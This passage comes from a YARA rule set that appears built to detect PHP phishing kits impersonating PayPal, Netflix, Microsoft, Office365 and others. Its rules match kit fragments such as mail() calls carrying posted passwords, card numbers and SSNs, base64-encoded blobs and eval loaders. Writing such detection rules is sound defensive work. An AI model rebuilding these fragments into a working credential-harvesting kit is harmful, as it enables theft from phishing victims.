        $ps0 = "$mail = base64_decode($_GET['domain']);"
    condition:
        $ps0
}

rule php_phishing_mailer_105 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR05748 and PR05749
}

private rule PR05750 : trigger
{
    strings:
        $ps0 = "curl_setopt($ch, CURLOPT_URL, \"http://mx-api.com"
    condition:
        $ps0
}

rule php_phishing_mailer_106 : phishing
{
    strings:
        $trigger = "echo $finish_url;"
    condition:
        $trigger and PR05750 and PR00317
}

private rule PR05751 : trigger
{
    strings:
        $ps0 = "if($_POST[$value]=="
    condition:
        $ps0
}

rule php_phishing_mailer_107 : phishing
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR00371 and PR05751 and PR01362
}

rule php_phishing_mailer_108 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.linkedin.com/"
    condition:
        $trigger and PR00301 and PR01123
}

// MANUAL FIX NECESSARY
private rule PR05752 : trigger
{
    strings:
        $ps0 = ".$_POST["
    condition:
        $ps0
}

rule php_phishing_mailer_109 : phishing
{
    strings:
        $trigger = "getenv(\"REMOTE_ADDR\");"
        $php_phishing_mailer_109_r0 = /\$[\w]+[\s]*\.=[\s]*.[\w]+[^;]+\$_POST\[.[\w]+.\]\...n.;[^\}]+mail\(.([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5}).[\s]*,/
    condition:
        $trigger and PR05752 and PR00301 and $php_phishing_mailer_109_r0
}

// MANUAL FIX NECESSARY
rule php_phishing_mailer_110 : phishing
{
    strings:
        $trigger = "getenv(\"REMOTE_ADDR\");"
        $php_phishing_mailer_110_r0 = /\$[\w]+[\s]*=[\s]*getenv\(.REMOTE_ADDR.\);[^;]+gethostbyaddr\(\$[\w]+\)[^>]+mail\(\$[\w]+,[^:]+From:[\s]*[\w]+<[^<]+<META[\s]*http-equiv=.refresh.[^>]+>.\);/
    condition:
        $trigger and PR05752 and PR00301 and $php_phishing_mailer_110_r0
}

private rule PR05753 : trigger
{
    strings:
        $ps0 = "$password"
    condition:
        $ps0
}

rule php_phishing_mailer_111 : phishing
{
    strings:
        $trigger = "geoplugin_countryName"
    condition:
        $trigger and PR00437 and PR00301 and PR02163 and PR05753
}

rule php_phishing_mailer_112 : phishing
{
    strings:
        $trigger = "JGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokbWVzc2FnZSAuPSAiLS0tLS0tL"
    condition:
        $trigger and PR01398
}

rule php_phishing_mailer_113 : phishing
{
    strings:
        $trigger = "$country = $details->country;"
    condition:
        $trigger and PR00273 and PR01403
}

private rule PR05754 : trigger
{
    strings:
        $ps0 = "->country;"
    condition:
        $ps0
}

private rule PR05755 : trigger
{
    strings:
        $ps0 = "gethostbyaddr($ip);"
    condition:
        $ps0
}

rule php_phishing_mailer_114 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR05754 and PR04520 and PR05755 and PR00301
}

// MANUAL FIX NECESSARY
rule php_phishing_mailer_115 : phishing
{
    strings:
        $trigger = "equire"
        $php_phishing_mailer_115_r0 = /send\(\$_SESSION,[\s]*\$to,[\s]*\$subject\)[\s]*;/
    condition:
        $trigger and $php_phishing_mailer_115_r0
}

rule php_phishing_mailer_116 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR05697 and PR04093 and PR00273
}

private rule PR05756 : trigger
{
    strings:
        $ps0 = "$message .= \"-----"
    condition:
        $ps0
}

private rule PR05757 : trigger
{
    strings:
        $ps0 = "$_POST['password'].\"\\n\";"
    condition:
        $ps0
}

rule php_phishing_mailer_117 : phishing
{
    strings:
        $trigger = "------------\\n\";"
    condition:
        $trigger and PR05756 and PR05757
}

rule php_phishing_mailer_118 : phishing
{
    strings:
        $trigger = "bWVtb3J5X2xpbWl0IiwtMSk7CgoKJGxlYWZbJ3ZlcnNpb24nXT"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR05758 : trigger
{
    strings:
        $ps0 = "geoplugin"
    condition:
        $ps0
}

private rule PR05759 : trigger
{
    strings:
        $ps0 = "@unserialize(file_get_contents("
    condition:
        $ps0
}

rule php_phishing_mailer_119 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR00317 and PR05758 and PR05759
}

private rule PR05760 : trigger
{
    strings:
        $ps0 = "@mail($to,"
    condition:
        $ps0
}

rule php_phishing_mailer_120 : phishing
{
    strings:
        $trigger = "iPhone"
    condition:
        $trigger and PR05760 and PR00273
}

// MANUAL FIX NECESSARY
private rule PR05761 : trigger
{
    strings:
        $ps0 = "fputs ($"
    condition:
        $ps0
}

rule php_phishing_mailer_121 : phishing
{
    strings:
        $trigger = "mail($"
        $php_phishing_mailer_121_r0 = /\$_POST\[.[pP][aA][sS][sS][wW][oO][rR][dD].\]/
    condition:
        $trigger and PR05761 and PR00247 and $php_phishing_mailer_121_r0
}

private rule PR05762 : trigger
{
    strings:
        $ps0 = "$data = \"\\r\\nAddress: $address Account: $username Password:"
    condition:
        $ps0
}

rule php_phishing_mailer_122 : phishing
{
    strings:
        $trigger = "$subject"
    condition:
        $trigger and PR00301 and PR05762
}

private rule PR05763 : trigger
{
    strings:
        $ps0 = "$message.= 'Password:"
    condition:
        $ps0
}

rule php_phishing_mailer_123 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05763 and PR00301 and PR00336
}

rule php_phishing_mailer_124 : phishing
{
    strings:
        $trigger = "Coded By x-Phisher"
    condition:
        $trigger and PR02609
}

rule php_phishing_mailer_125 : phishing
{
    strings:
        $trigger = "\"Credit Card Number: \".$_POST['cc']."
    condition:
        $trigger and PR00301 and PR00336 and PR00247
}

private rule PR05764 : trigger
{
    strings:
        $ps0 = "(strpos(strtolower($ExactBrowserNameUA)"
    condition:
        $ps0
}

rule php_phishing_mailer_126 : phishing
{
    strings:
        $trigger = "gethostbyaddr($_SERVER["
    condition:
        $trigger and PR05764 and PR00273
}

private rule PR05765 : trigger
{
    strings:
        $ps0 = "urlencode($messaggio);"
    condition:
        $ps0
}

rule php_phishing_mailer_127 : phishing
{
    strings:
        $trigger = "@mail($pfw_email_to"
    condition:
        $trigger and PR00273 and PR01403 and PR05765
}

private rule PR05766 : trigger
{
    strings:
        $ps0 = "centurylink.com"
    condition:
        $ps0
}

rule php_phishing_mailer_128 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR05766
}

private rule PR05767 : trigger
{
    strings:
        $ps0 = "htmlspecialchars($_POST['password"
    condition:
        $ps0
}

rule php_phishing_mailer_129 : phishing
{
    strings:
        $trigger = "meta http-equiv=\"refresh"
    condition:
        $trigger and PR05767 and PR00301 and PR02480
}

private rule PR05768 : trigger
{
    strings:
        $ps0 = "$_POST['bankname"
    condition:
        $ps0
}

rule php_phishing_mailer_130 : phishing
{
    strings:
        $trigger = "$mail->AddAddress("
    condition:
        $trigger and PR02741 and PR05768 and PR03964
}

private rule PR05769 : trigger
{
    strings:
        $ps0 = "header('HTTP/1.0 403 Forbidden"
    condition:
        $ps0
}

rule php_phishing_mailer_131 : phishing
{
    strings:
        $trigger = "$message .="
    condition:
        $trigger and PR00301 and PR01403 and PR05769 and PR00247
}

private rule PR05770 : trigger
{
    strings:
        $ps0 = "if (!empty($vbvError)) {echo $vbvError; }"
    condition:
        $ps0
}

rule php_phishing_mailer_132 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00301 and PR01403 and PR05770
}

rule php_phishing_mailer_133 : phishing
{
    strings:
        $trigger = "$dir->read())"
    condition:
        $trigger and PR05717 and PR00301 and PR00247
}

// MANUAL FIX NECESSARY
rule php_phishing_mailer_134 : phishing
{
    strings:
        $trigger = "$message"
        $php_phishing_mailer_134_r0 = /\$message[\s]*\.?=[\s]*['\"][\s]*[-+=*!@#~_.\|\[\]><]{3,}[\s]*[-+=*!@#~_.><\w]{2,}/
        $php_phishing_mailer_134_r1 = /\$message[\s]*\.?=[\s]*[^;]+\$_(POST|GET|SERVER)\[[^;]+;[^\x02]+[\s@]mail\([^;]+\$message[^;]*\);/
    condition:
        $trigger and $php_phishing_mailer_134_r0 and $php_phishing_mailer_134_r1
}

private rule PR05771 : trigger
{
    strings:
        $ps0 = "json_decode(curl_exec($"
    condition:
        $ps0
}

rule php_phishing_mailer_135 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR01369 and PR01401 and PR04150 and PR05771
}

// MANUAL FIX NECESSARY
private rule PR05772 : trigger
{
    strings:
        $ps0 = "#0a5d00;'>LOGIN INFORMATION</font> ]"
    condition:
        $ps0
}

rule php_phishing_mailer_136 : phishing
{
    strings:
        $trigger = "file_get_contents"
        $php_phishing_mailer_136_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR00355 and PR05772 and PR00357 and $php_phishing_mailer_136_r0
}

private rule PR05773 : trigger
{
    strings:
        $ps0 = "+=+=+=+=+=## Dachoka - Tantan ##+=+=+=+=+=\";"
    condition:
        $ps0
}

rule php_phishing_mailer_137 : phishing
{
    strings:
        $trigger = "getenv(\"REMOTE_ADDR\");"
    condition:
        $trigger and PR05752 and PR00301 and PR05773
}

private rule PR05774 : trigger
{
    strings:
        $ps0 = "@fclose(@fwrite(@fopen"
    condition:
        $ps0
}

rule php_phishing_mailer_138 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR05774
}

rule php_phishing_mailer_139 : phishing
{
    strings:
        $trigger = "geoip"
    condition:
        $trigger and PR00437 and PR04085 and PR04208
}

// MANUAL FIX NECESSARY
private rule PR05775 : trigger
{
    strings:
        $ps0 = "= \"Fido INFO"
    condition:
        $ps0
}

rule php_phishing_mailer_140 : phishing
{
    strings:
        $trigger = "$_POST"
        $php_phishing_mailer_140_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR05775 and PR00397 and $php_phishing_mailer_140_r0
}

rule php_phishing_mailer_141 : phishing
{
    strings:
        $trigger = "<H1>Fuck Off Punk!</H1>"
    condition:
        $trigger and PR00092
}

rule php_phishing_mailer_142 : phishing
{
    strings:
        $trigger = "'Notification of working Function'"
    condition:
        $trigger and PR00437 and PR04085
}

rule php_phishing_mailer_143 : phishing
{
    strings:
        $trigger = ".= '<TITLE>404 Not Found</TITLE>' . PHP_EOL;"
    condition:
        $trigger and PR00273
}

private rule PR05776 : trigger
{
    strings:
        $ps0 = ".= \"From: OUTLOOK\";"
    condition:
        $ps0
}

rule php_phishing_mailer_143_02 : phishing
{
    strings:
        $trigger = "isset("
    condition:
        $trigger and PR00029 and PR05776 and PR01623
}

private rule PR05777 : trigger
{
    strings:
        $ps0 = "From: OWA"
    condition:
        $ps0
}

rule php_phishing_mailer_144 : phishing
{
    strings:
        $trigger = "geoplugin_countryName"
    condition:
        $trigger and PR05777 and PR00437 and PR00301
}

private rule PR05778 : trigger
{
    strings:
        $ps0 = "if(@$_GET['accedi']=='login'){"
    condition:
        $ps0
}

rule php_phishing_mailer_146 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR05778
}

private rule PR05779 : trigger
{
    strings:
        $ps0 = "mail ("
    condition:
        $ps0
}

private rule PR05780 : trigger
{
    strings:
        $ps0 = "$ip = getenv(\"REMOTE_ADDR\");"
    condition:
        $ps0
}

rule php_phishing_mailer_147 : phishing
{
    strings:
        $trigger = "fputs ($file, \"Password"
    condition:
        $trigger and PR05779 and PR00538 and PR05780
}

private rule PR05781 : trigger
{
    strings:
        $ps0 = "eval(file_get_contents(\"../"
    condition:
        $ps0
}

rule php_phishing_mailer_148 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR04190 and PR05781 and PR04191
}

private rule PR05782 : trigger
{
    strings:
        $ps0 = "mail($send, $subject, $message);"
    condition:
        $ps0
}

rule php_phishing_mailer_149 : phishing
{
    strings:
        $trigger = "$msg"
    condition:
        $trigger and PR05703 and PR01123 and PR05782
}

private rule PR05783 : trigger
{
    strings:
        $ps0 = "$password = urldecode($_POST['pass']);"
    condition:
        $ps0
}

rule php_phishing_mailer_150 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR05783 and PR05703
}

private rule PR05784 : trigger
{
    strings:
        $ps0 = "gethostbyaddr($"
    condition:
        $ps0
}

private rule PR05785 : trigger
{
    strings:
        $ps0 = "$mes .= \""
    condition:
        $ps0
}

rule php_phishing_mailer_151 : phishing
{
    strings:
        $trigger = "getenv(\"REMOTE_ADDR"
    condition:
        $trigger and PR05784 and PR01403 and PR05785 and PR00273
}

private rule PR05786 : trigger
{
    strings:
        $ps0 = "telegram_send"
    condition:
        $ps0
}

rule php_phishing_mailer_152 : phishing
{
    strings:
        $trigger = "file_put_contents("
    condition:
        $trigger and PR05786 and PR00301 and PR02163 and PR02480
}

private rule PR05787 : trigger
{
    strings:
        $ps0 = "echo '<meta http-equiv=\"refresh\" content=\"0; url="
    condition:
        $ps0
}

rule php_phishing_mailer_153 : phishing
{
    strings:
        $trigger = "mail($_SESSION[\"send\"],$subject,$"
    condition:
        $trigger and PR00437 and PR05787
}

private rule PR05788 : trigger
{
    strings:
        $ps0 = "htmlspecialchars($_POST['ssn'],"
    condition:
        $ps0
}

rule php_phishing_mailer_154 : phishing
{
    strings:
        $trigger = "\"==Multipart_Boundary_x{$semi_rand}x\";"
    condition:
        $trigger and PR00437 and PR00301 and PR05788
}

rule php_phishing_mailer_155 : phishing
{
    strings:
        $trigger = "3D Full Card"
    condition:
        $trigger and PR00301
}

rule php_phishing_mailer_156 : phishing
{
    strings:
        $trigger = "$message .= \"=============IP*DATE*"
    condition:
        $trigger and PR02062 and PR01021
}

private rule PR05789 : trigger
{
    strings:
        $ps0 = "V!CT!M INFO</font>"
    condition:
        $ps0
}

rule php_phishing_mailer_157 : phishing
{
    strings:
        $trigger = "From:"
    condition:
        $trigger and PR05789 and PR04190 and PR04213
}

private rule PR05790 : trigger
{
    strings:
        $ps0 = "mail($to, $subject, $message, $headers);"
    condition:
        $ps0
}

rule php_phishing_mailer_158 : phishing
{
    strings:
        $trigger = "$msg"
    condition:
        $trigger and PR05790 and PR05703 and PR01123
}

rule php_phishing_mailer_159 : phishing
{
    strings:
        $trigger = "mail($to,$subject,$msg,$from);"
    condition:
        $trigger and PR00273 and PR04265
}

private rule PR05791 : trigger
{
    strings:
        $ps0 = "Password: $passe\\n"
    condition:
        $ps0
}

rule php_phishing_mailer_160 : phishing
{
    strings:
        $trigger = "$subj ="
    condition:
        $trigger and PR00386 and PR00301 and PR00387 and PR05791
}

private rule PR05792 : trigger
{
    strings:
        $ps0 = ".@$REMOTE_ADDR"
    condition:
        $ps0
}

rule php_phishing_mailer_161 : phishing
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR05792 and PR00273 and PR01403
}

private rule PR05793 : trigger
{
    strings:
        $ps0 = "mail($to,"
    condition:
        $ps0
}

rule php_phishing_mailer_162 : phishing
{
    strings:
        $trigger = "gethostbyaddr($_SERVER["
    condition:
        $trigger and PR00371 and PR00273 and PR05793
}

private rule PR05794 : trigger
{
    strings:
        $ps0 = "Pwxd:"
    condition:
        $ps0
}

rule php_phishing_mailer_163 : phishing
{
    strings:
        $trigger = "From:"
    condition:
        $trigger and PR05794 and PR04190 and PR04213
}

rule php_phishing_mailer_164 : phishing
{
    strings:
        $trigger = ".= 'Card CVV"
    condition:
        $trigger and PR02521 and PR01021 and PR00279
}

rule php_phishing_mailer_165 : phishing
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04092 and PR00273 and PR01403
}

private rule PR05795 : trigger
{
    strings:
        $ps0 = "<title>Mailer</title>"
    condition:
        $ps0
}

rule php_phishing_mailer_166 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00046 and PR05795
}

private rule PR05796 : trigger
{
    strings:
        $ps0 = "require_once 'config/config.php';"
    condition:
        $ps0
}

rule php_phishing_mailer_167 : phishing
{
    strings:
        $trigger = "$ip = $_SERVER['REMOTE_ADDR'];"
    condition:
        $trigger and PR00437 and PR04085 and PR05796
}

private rule PR05797 : trigger
{
    strings:
        $ps0 = "Dangerous Mailer"
    condition:
        $ps0
}

rule php_phishing_mailer_168 : phishing
{
    strings:
        $trigger = "file_exists"
    condition:
        $trigger and PR05797
}

private rule PR05798 : trigger
{
    strings:
        $ps0 = "Password: $"
    condition:
        $ps0
}

private rule PR05799 : trigger
{
    strings:
        $ps0 = "header(\"Location"
    condition:
        $ps0
}

rule php_phishing_mailer_169 : phishing
{
    strings:
        $trigger = "$subj ="
    condition:
        $trigger and PR00386 and PR05798 and PR05799 and PR00387 and PR00301
}

private rule PR05800 : trigger
{
    strings:
        $ps0 = "$mail_sender = \"From"
    condition:
        $ps0
}

rule php_phishing_mailer_170 : phishing
{
    strings:
        $trigger = "echo json_encode($"
    condition:
        $trigger and PR00091 and PR00341 and PR05800 and PR00342
}

// MANUAL FIX NECESSARY
private rule PR05801 : trigger
{
    strings:
        $ps0 = "$headers = \"From"
    condition:
        $ps0
}

rule php_phishing_mailer_171 : phishing
{
    strings:
        $trigger = "mail($"
        $php_phishing_mailer_171_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR05801 and PR00355 and PR01330 and PR00357 and PR01431 and $php_phishing_mailer_171_r0
}

private rule PR05802 : trigger
{
    strings:
        $ps0 = "@mail($to"
    condition:
        $ps0
}

rule php_phishing_mailer_172 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR05759 and PR05799 and PR05802
}

private rule PR05803 : trigger
{
    strings:
        $ps0 = "!empty($_REQUEST"
    condition:
        $ps0
}

private rule PR05804 : trigger
{
    strings:
        $ps0 = "$message .="
    condition:
        $ps0
}

private rule PR05805 : trigger
{
    strings:
        $ps0 = "\".$ip.\"\\n\";"
    condition:
        $ps0
}

rule php_phishing_mailer_173 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR05803 and PR00322 and PR05804 and PR05805
}

rule php_phishing_metamask_001 : phishing
{
    strings:
        $trigger = "MetaMask - A crypto wallet"
    condition:
        $trigger and PR00042
}

rule php_phishing_microsoft_001 : phishing
{
    strings:
        $trigger = "<span>Use your Microsoft"
    condition:
        $trigger and PR00042
}

rule php_phishing_microsoft_002 : phishing
{
    strings:
        $trigger = "<title>Secure Email Portal</title>"
    condition:
        $trigger and PR00044
}

rule php_phishing_microsoft_003 : phishing
{
    strings:
        $trigger = "<title>Sign in to your account </title>"
    condition:
        $trigger and PR02534 and PR01382
}

private rule PR05806 : trigger
{
    strings:
        $ps0 = "explode(\"@\",$_REQUEST["
    condition:
        $ps0
}

rule php_phishing_microsoft_004 : phishing
{
    strings:
        $trigger = "$testgo = \"$site$testencoded\";"
    condition:
        $trigger and PR05806 and PR01431
}

rule php_phishing_microsoft_005 : phishing
{
    strings:
        $trigger = "<title>Microsoft Office | Share, Upload, Extract</title>"
    condition:
        $trigger
}

private rule PR05807 : trigger
{
    strings:
        $ps0 = "<title>Sign in</title>"
    condition:
        $ps0
}

private rule PR05808 : trigger
{
    strings:
        $ps0 = "\xc2\xa92018 Microsoft"
    condition:
        $ps0
}

rule php_phishing_microsoft_006 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05807 and PR05808
}

rule php_phishing_microsoft_007 : phishing
{
    strings:
        $trigger = "\xc2\xa92018 Microsoft"
    condition:
        $trigger and PR00042
}

rule php_phishing_microsoft_008 : phishing
{
    strings:
        $trigger = "&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;"
    condition:
        $trigger and PR00042
}

rule php_phishing_microsoft_009 : phishing
{
    strings:
        $trigger = "<title>Microsoft account loading"
    condition:
        $trigger
}

rule php_phishing_microsoft_010 : phishing
{
    strings:
        $trigger = "<title>0FFICE 365"
    condition:
        $trigger
}

rule php_phishing_microsoft_011 : phishing
{
    strings:
        $trigger = "<title>Microsoft Office Center"
    condition:
        $trigger
}

private rule PR05809 : trigger
{
    strings:
        $ps0 = "Mr Trovaz"
    condition:
        $ps0
}

rule php_phishing_MrTrovaz_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00634 and PR05809
}

rule php_phishing_natwest_001 : phishing
{
    strings:
        $trigger = "ocation: http://www.natwest.com/personal/logout/logout.ashx"
    condition:
        $trigger and PR00431
}

rule php_phishing_netease_001 : phishing
{
    strings:
        $trigger = "<title>\xe7\xbd\x91\xe6\x98\x93\xe4\xbc\x81\xe4\xb8\x9a\xe9\x82\xae\xe7\xae\xb1"
    condition:
        $trigger
}

rule php_phishing_netflix_001 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.netflix.com"
    condition:
        $trigger
}

rule php_phishing_netflix_002 : phishing
{
    strings:
        $trigger = "<title>Netflix"
    condition:
        $trigger
}

private rule PR05810 : trigger
{
    strings:
        $ps0 = "<script>window.location="
    condition:
        $ps0
}

private rule PR05811 : trigger
{
    strings:
        $ps0 = "<title>404 NOT FROUND</title>"
    condition:
        $ps0
}

rule php_phishing_netflix_003 : phishing
{
    strings:
        $trigger = "if(isset($_GET['email']))"
    condition:
        $trigger and PR05810 and PR05811
}

private rule PR05812 : trigger
{
    strings:
        $ps0 = "(isset($_POST['email']) && isset($_POST['password'])) ? 'https://www.netflix.com/Login?"
    condition:
        $ps0
}

rule php_phishing_netflix_004 : phishing
{
    strings:
        $trigger = "header("
    condition:
        $trigger and PR05812
}

rule php_phishing_netflix_005 : phishing
{
    strings:
        $trigger = "$subject = \"LOGIN NETFLIX ["
    condition:
        $trigger
}

rule php_phishing_netflix_006 : phishing
{
    strings:
        $trigger = "header(\"Location: http://www.netflix."
    condition:
        $trigger and PR05780
}

private rule PR05813 : trigger
{
    strings:
        $ps0 = "curl_setopt($"
    condition:
        $ps0
}

private rule PR05814 : trigger
{
    strings:
        $ps0 = "windows nt 10"
    condition:
        $ps0
}

rule php_phishing_netflix_007 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR00317 and PR05813 and PR05814 and PR05256
}

private rule PR05815 : trigger
{
    strings:
        $ps0 = "From:Netflix"
    condition:
        $ps0
}

rule php_phishing_netflix_008 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR00273 and PR05815
}

private rule PR05816 : trigger
{
    strings:
        $ps0 = "From: Netflix"
    condition:
        $ps0
}

rule php_phishing_netflix_008_02 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR00273 and PR05816
}

private rule PR05817 : trigger
{
    strings:
        $ps0 = "base64_decode('LmNvb2tpZQ=="
    condition:
        $ps0
}

rule php_phishing_netflix_009 : phishing
{
    strings:
        $trigger = "echo base64"
    condition:
        $trigger and PR05817
}

rule php_phishing_nordea_001 : phishing
{
    strings:
        $trigger = "header(\"Location: http://www.nordea.dk"
    condition:
        $trigger
}

private rule PR05818 : trigger
{
    strings:
        $ps0 = "----+ Office365"
    condition:
        $ps0
}

rule php_phishing_office365_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05818 and PR00281
}

private rule PR05819 : trigger
{
    strings:
        $ps0 = "$cl = explode( '/', $_GET['cl'] );"
    condition:
        $ps0
}

rule php_phishing_office365_002 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR05819
}

rule php_phishing_office365_003 : phishing
{
    strings:
        $trigger = "Facebook: facebook.com/Ex.Robotos"
    condition:
        $trigger
}

private rule PR05820 : trigger
{
    strings:
        $ps0 = ";return EvAl($"
    condition:
        $ps0
}

rule php_phishing_office365_004 : phishing
{
    strings:
        $trigger = "Encrypted by"
    condition:
        $trigger and PR05820 and PR01179
}

private rule PR05821 : trigger
{
    strings:
        $ps0 = "<title>Office365"
    condition:
        $ps0
}

rule php_phishing_office365_005 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00046 and PR05821
}

private rule PR05822 : trigger
{
    strings:
        $ps0 = "Office365"
    condition:
        $ps0
}

private rule PR05823 : trigger
{
    strings:
        $ps0 = "SBA Loan Number"
    condition:
        $ps0
}

rule php_phishing_office365_006 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR05822 and PR00046 and PR05823
}

private rule PR05824 : trigger
{
    strings:
        $ps0 = "header(\"location: $src\");"
    condition:
        $ps0
}

rule php_phishing_onedrive_001 : phishing
{
    strings:
        $trigger = "base64_encode("
    condition:
        $trigger and PR05824
}

private rule PR05825 : trigger
{
    strings:
        $ps0 = "$response = mail($to,$subject,$"
    condition:
        $ps0
}

rule php_phishing_opensrs_001 : phishing
{
    strings:
        $trigger = "$_POST['email'].\" \".$_POST['password']"
    condition:
        $trigger and PR00437 and PR05825
}

rule php_phishing_optimum_001 : phishing
{
    strings:
        $trigger = "<title>Sign In to Manage Your Services | Optimum"
    condition:
        $trigger and PR00281
}

rule php_phishing_ourtime_001 : phishing
{
    strings:
        $trigger = "\"ourtime.php?$host\""
    condition:
        $trigger and PR00091
}

rule php_phishing_ourtime_002 : phishing
{
    strings:
        $trigger = "<title>ourtime.com"
    condition:
        $trigger
}

rule php_phishing_ourtime_003 : phishing
{
    strings:
        $trigger = "OurTimecom"
    condition:
        $trigger and PR00042
}

rule php_phishing_painel_admin_tela_001 : phishing
{
    strings:
        $trigger = "$caminho = \"contador.txt\";//nome do arquivo que vai guardar"
    condition:
        $trigger and PR00042
}

private rule PR05826 : trigger
{
    strings:
        $ps0 = "=> Scam Option for labels of Update Page <="
    condition:
        $ps0
}

rule php_phishing_paypal_001 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR05826
}

rule php_phishing_paypal_001_02 : phishing
{
    strings:
        $trigger = "' action=\"./loge.php?cmd=_login-submit&dispatch=58"
    condition:
        $trigger and PR01700
}

private rule PR05827 : trigger
{
    strings:
        $ps0 = "<div id=\"headline\"><h2 class=\"accessAid\"><?php echo $processing; ?></h2>"
    condition:
        $ps0
}

rule php_phishing_paypal_001_03 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR05827
}

rule php_phishing_paypal_001_04 : phishing
{
    strings:
        $trigger = "php echo $passwordRecovery1_a_0; ?>\" class=\"input-button passwordRecovery"
    condition:
        $trigger
}

rule php_phishing_paypal_001_05 : phishing
{
    strings:
        $trigger = "$subject = \"LOG-Pp  | $ip\";"
    condition:
        $trigger
}

private rule PR05828 : trigger
{
    strings:
        $ps0 = "subject(){return \"CC | \".$_POST['RCP_COUNTRY'].\" | \".$_POST['CN'].\" | \".getenv"
    condition:
        $ps0
}

rule php_phishing_paypal_001_06 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR05828
}

rule php_phishing_paypal_001_07 : phishing
{
    strings:
        $trigger = "<p class=\"copyright\"><span class=\"securePage\">Secure page</span>PayPal"
    condition:
        $trigger and PR00493
}

rule php_phishing_paypal_002 : phishing
{
    strings:
        $trigger = "belongs to an existing PayPal/i\", $last_http_page"
    condition:
        $trigger and PR00493
}

private rule PR05829 : trigger
{
    strings:
        $ps0 = "$scam = \"Updateto\";"
    condition:
        $ps0
}

rule php_phishing_paypal_005 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR05829
}

private rule PR05830 : trigger
{
    strings:
        $ps0 = "Scam PayPal V"
    condition:
        $ps0
}

rule php_phishing_paypal_006 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05830
}

private rule PR05831 : trigger
{
    strings:
        $ps0 = "\xc2\xa6--- PRIVATE  PP SCAM"
    condition:
        $ps0
}

rule php_phishing_paypal_007 : phishing
{
    strings:
        $trigger = "ror_reporting"
    condition:
        $trigger and PR05831
}

private rule PR05832 : trigger
{
    strings:
        $ps0 = "\xc2\xa6--- PRIVATE PAYPAL SCAM"
    condition:
        $ps0
}

rule php_phishing_paypal_007_01 : phishing
{
    strings:
        $trigger = "ror_reporting"
    condition:
        $trigger and PR05832
}

private rule PR05833 : trigger
{
    strings:
        $ps0 = "L&omicron;gin - &Rho;&#97;&#121;&Rho;&#97;&#108;"
    condition:
        $ps0
}

rule php_phishing_paypal_008 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05833
}

private rule PR05834 : trigger
{
    strings:
        $ps0 = "$(location).attr(\"href\", \"myaccount?cmd=_update&dispatch=<?php echo $dis ?>&locale=en_<?php echo $countrycode ?>\");"
    condition:
        $ps0
}

rule php_phishing_paypal_011 : phishing
{
    strings:
        $trigger = "<title>"
    condition:
        $trigger and PR05834 and PR00493
}

private rule PR05835 : trigger
{
    strings:
        $ps0 = "X-T@MPER V8. */"
    condition:
        $ps0
}

rule php_phishing_paypal_012 : phishing
{
    strings:
        $trigger = "$codelock_enc=\"Antibots.php\"; $codelock_"
    condition:
        $trigger and PR02977 and PR02534 and PR05835
}

private rule PR05836 : trigger
{
    strings:
        $ps0 = "/* xPayPal"
    condition:
        $ps0
}

rule php_phishing_paypal_013 : phishing
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR01330 and PR05836
}

rule php_phishing_paypal_013_02 : phishing
{
    strings:
        $trigger = "?=$_SERVER[base64_decode("
    condition:
        $trigger and PR01408
}

rule php_phishing_paypal_013_03 : phishing
{
    strings:
        $trigger = "(isset($_GET[base64_decode(chr("
    condition:
        $trigger and PR01330
}

private rule PR05837 : trigger
{
    strings:
        $ps0 = "PayPal"
    condition:
        $ps0
}

rule php_phishing_paypal_013_04 : phishing
{
    strings:
        $trigger = "$_POST[base64_decode(chr("
    condition:
        $trigger and PR01330 and PR05837
}

rule php_phishing_paypal_013_05 : phishing
{
    strings:
        $trigger = "move_uploaded_file($_FILES[base64_decode("
    condition:
